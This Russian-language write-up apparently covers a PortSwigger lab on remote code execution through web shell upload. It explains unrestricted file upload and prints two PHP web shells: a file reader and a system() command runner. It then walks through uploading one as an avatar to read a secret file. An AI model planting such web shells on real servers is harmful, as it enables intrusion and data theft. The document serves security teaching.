# Remote code execution via web shell upload

## Theory

<h3>Использование неограниченной загрузки файлов для развертывания веб-шелла</h3>

С точки зрения безопасности наихудший возможный сценарий — это когда веб-сайт позволяет загружать скрипты на стороне сервера, такие как файлы PHP, Java или Python, а также настроен на их выполнение в виде кода. Это упрощает создание собственной веб-оболочки на сервере.

Если вы можете успешно загрузить веб-оболочку, вы фактически имеете полный контроль над сервером. Это означает, что вы можете читать и записывать произвольные файлы, извлекать конфиденциальные данные и даже использовать сервер для направленных атак как на внутреннюю инфраструктуру, так и на другие серверы за пределами сети. Например, следующий однострочный PHP-код можно использовать для чтения произвольных файлов из файловой системы сервера:
```
<?php echo file_get_contents('/path/to/target/file'); ?>
```

После загрузки отправка запроса на этот вредоносный файл вернет содержимое целевого файла в ответ.

Более универсальная веб-оболочка может выглядеть так:
```
<?php echo system($_GET['command']); ?>
```

Этот сценарий позволяет вам передать произвольную системную команду через параметр запроса следующим образом:
```
GET /example/exploit.php?command=id HTTP/1.1
```

## Writeup

* Имеющиеся данные: 
    * Данные нашего аккаунта: wiener:peter

Главная страница:

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/File_upload_vulnerabilities/Remote_code_execution_via_web_shell_upload/assets/1.png)

Логинимся c имеющимися данными. У нас есть возможность загрузки аватара пользователя. Загружаем эксплоит. Получаем сообщение об успешной загрузке файла.

Код эксплоита:
```
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/File_upload_vulnerabilities/Remote_code_execution_via_web_shell_upload/assets/2.png)

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/File_upload_vulnerabilities/Remote_code_execution_via_web_shell_upload/assets/3.png)

Обновляем страницу. Теперь мы можем найти наш запрос. Отправляем запрос и получаем содержимое файла.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/File_upload_vulnerabilities/Remote_code_execution_via_web_shell_upload/assets/4.png)

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/File_upload_vulnerabilities/Remote_code_execution_via_web_shell_upload/assets/5.png)

Подтверждаем ответ и получаем ответ от сервера.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/File_upload_vulnerabilities/Remote_code_execution_via_web_shell_upload/assets/6.png)
